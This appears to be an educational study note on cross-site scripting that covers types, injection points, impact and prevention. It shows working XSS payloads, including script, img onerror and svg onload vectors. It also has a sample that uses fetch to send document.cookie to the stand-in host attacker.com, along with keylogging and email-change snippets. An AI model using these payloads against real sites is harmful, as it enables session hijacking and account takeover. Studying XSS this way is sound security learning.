# Cross-Site Scripting (XSS)

* Severity: High

* OWASP Category: Injection

* Common Impact: Account Takeover, Session Hijacking, Data Theft

---

## What is XSS?

* Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious JavaScript into a web application.

* The injected script executes inside the victim's browser.

* The browser treats the malicious code as legitimate application code.

---

## How XSS Happens

* An application accepts user input.

* The input is displayed back to users.

* Input is not properly sanitized or encoded.

* The browser interprets the input as executable JavaScript.

---

## What is an XSS Payload?

* An XSS payload is JavaScript code injected by an attacker.

* The payload executes inside another user's browser.

* Attackers modify payloads depending on where the input appears in the page.

---

## Components of an XSS Payload

### Intention

* Defines what the attacker wants to achieve.

* Examples:

  * Display an alert box
  * Steal cookies
  * Log keystrokes
  * Take over accounts

### Modification

* Payloads often require adjustments.

* Modifications depend on:

  * HTML context
  * Attribute context
  * JavaScript context

* The goal is to ensure successful execution.

---

## Testing for XSS

* Security testers usually start with a basic payload.

```html
<script>alert('XSS')</script>
```

* If an alert box appears, JavaScript execution is confirmed.

---

## Common Injection Points

* Search Fields

* Comment Sections

* User Profiles

* Feedback Forms

* URL Parameters

---

## Example

### Normal Input

```text
https://site.thm/search?q=hello
```

Application Output:

```text
You searched for: hello
```

### Malicious Input

```html
<script>alert(1)</script>
```

* If the application does not sanitize input, the script executes.

---

## Types of XSS

### Reflected XSS

* Payload is reflected immediately in the response.

* Requires user interaction.

---

### Stored XSS

* Payload is stored by the application.

* Executes whenever users view the affected content.

---

### DOM-Based XSS

* Vulnerability exists in client-side JavaScript.

* Execution occurs within the browser DOM.

---

## Common Payloads

### Alert Payload

```html
<script>alert(1)</script>
```

---

### Image Error Payload

```html
<img src=x onerror=alert(1)>
```

---

### SVG Payload

```html
<svg onload=alert(1)>
```

---

## XSS Attack Scenarios

### Proof of Concept

```html
<script>alert('XSS')</script>
```

* Demonstrates successful JavaScript execution.

---

### Session Stealing

```html
<script>
fetch('https://attacker.com/steal?cookie=' + btoa(document.cookie));
</script>
```

* Attempts to send cookies to an attacker-controlled server.

---

### Key Logging

```html
<script>
document.onkeypress=function(e){
console.log(e.key);
}
</script>
```

* Records user keystrokes.

---

### Business Logic Abuse

```html
<script>
user.changeEmail('attacker@example.com');
</script>
```

* Attempts to abuse application functionality.

---

## Impact

* Session Hijacking

* Account Takeover

* Phishing

* Credential Theft

* Data Theft

* Unauthorized Actions

---

## Prevention

* Input Validation

* Output Encoding

* Content Security Policy (CSP)

* HttpOnly Cookies

* Secure Development Practices

---

## References

* OWASP XSS Prevention Cheat Sheet

* PortSwigger Web Security Academy

* TryHackMe XSS Labs

* Real-World Bug Bounty Reports
